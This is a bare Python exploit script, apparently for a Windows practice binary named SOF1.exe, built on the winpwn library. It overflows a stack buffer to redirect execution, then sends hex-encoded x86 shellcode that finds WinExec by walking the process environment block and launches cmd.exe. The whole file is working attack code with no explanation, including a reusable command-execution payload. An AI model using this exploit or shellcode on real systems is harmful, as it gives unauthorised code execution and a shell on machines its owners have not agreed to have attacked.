from winpwn import * 

p = process("./SOF1.exe") 
context.log_level = "debug"  
# context.windbg = "windbg.exe" 
main = eval(p.recvuntil("\n")[7:18])
shellcode_address = main + 0x2310 
print("MAIN = " + hex(main))

payload = "a" * 16 + p32(shellcode_address) 
p.sendline(payload)
# windbg.attach(p, 'bu 78105F')

buf = "\x50\x53\x51\x52\x56\x57\x55\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x6A\x63\x66\x68\x78\x65\x68\x57\x69\x6E\x45\x89\x65\xFC\x31\xF6\x64\x8B\x5E\x30\x31\xC0\xB0\x0F\x2C\x03\x8B\x1C\x03\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x31\xD2\xB2\x1F\x42\x8B\x3C\x10\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0E\x90\x90\x90\x90\x40\x39\xD0\x72\xE1\x83\xC4\x26\xEB\x44\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x65\x78\x65\x2E\x68\x63\x6D\x64\x2E\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x31\xDB\xB3\x0F\x80\xEB\x05\x56\xFF\xD0\x83\xC4\x46\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3"

p.sendline(buf) 
p.interactive()


